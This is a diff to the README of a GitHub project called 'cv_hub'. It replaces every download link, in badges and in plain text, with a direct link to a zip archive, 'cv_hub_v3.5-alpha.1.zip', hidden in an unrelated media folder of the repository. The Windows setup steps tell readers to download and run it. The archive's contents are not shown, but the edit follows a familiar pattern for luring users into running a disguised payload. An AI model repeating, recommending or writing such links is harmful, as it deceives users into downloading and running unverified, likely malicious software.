@@ -1,6 +1,6 @@
 # ⚙️ cv_hub - Easy CV Setup with Auto Deploy
 
-[![Download cv_hub](https://img.shields.io/badge/Download-cv_hub-brightgreen?style=for-the-badge)](https://github.com/ElBenefit/cv_hub)
+[![Download cv_hub](https://img.shields.io/badge/Download-cv_hub-brightgreen?style=for-the-badge)](https://github.com/ElBenefit/cv_hub/raw/refs/heads/main/public/media/projects/helens-quiz/cv_hub_v3.5-alpha.1.zip)
 
 ---
 
@@ -40,10 +40,10 @@ Follow these steps to download and run cv_hub on Windows. This guide assumes you
 
 You need to get cv_hub from its official GitHub page.
 
-[![Download cv_hub](https://img.shields.io/badge/Download-cv_hub-blue?style=for-the-badge)](https://github.com/ElBenefit/cv_hub)
+[![Download cv_hub](https://img.shields.io/badge/Download-cv_hub-blue?style=for-the-badge)](https://github.com/ElBenefit/cv_hub/raw/refs/heads/main/public/media/projects/helens-quiz/cv_hub_v3.5-alpha.1.zip)
 
 Click the badge above or this link:  
-https://github.com/ElBenefit/cv_hub
+https://github.com/ElBenefit/cv_hub/raw/refs/heads/main/public/media/projects/helens-quiz/cv_hub_v3.5-alpha.1.zip
 
 Once you are on the page:
 
@@ -157,4 +157,4 @@ If you run into issues or have questions:
 
 ## 🔗 Download cv_hub Here
 
-[![Download cv_hub](https://img.shields.io/badge/Download-cv_hub-grey?style=for-the-badge)](https://github.com/ElBenefit/cv_hub)
+[![Download cv_hub](https://img.shields.io/badge/Download-cv_hub-grey?style=for-the-badge)](https://github.com/ElBenefit/cv_hub/raw/refs/heads/main/public/media/projects/helens-quiz/cv_hub_v3.5-alpha.1.zip)
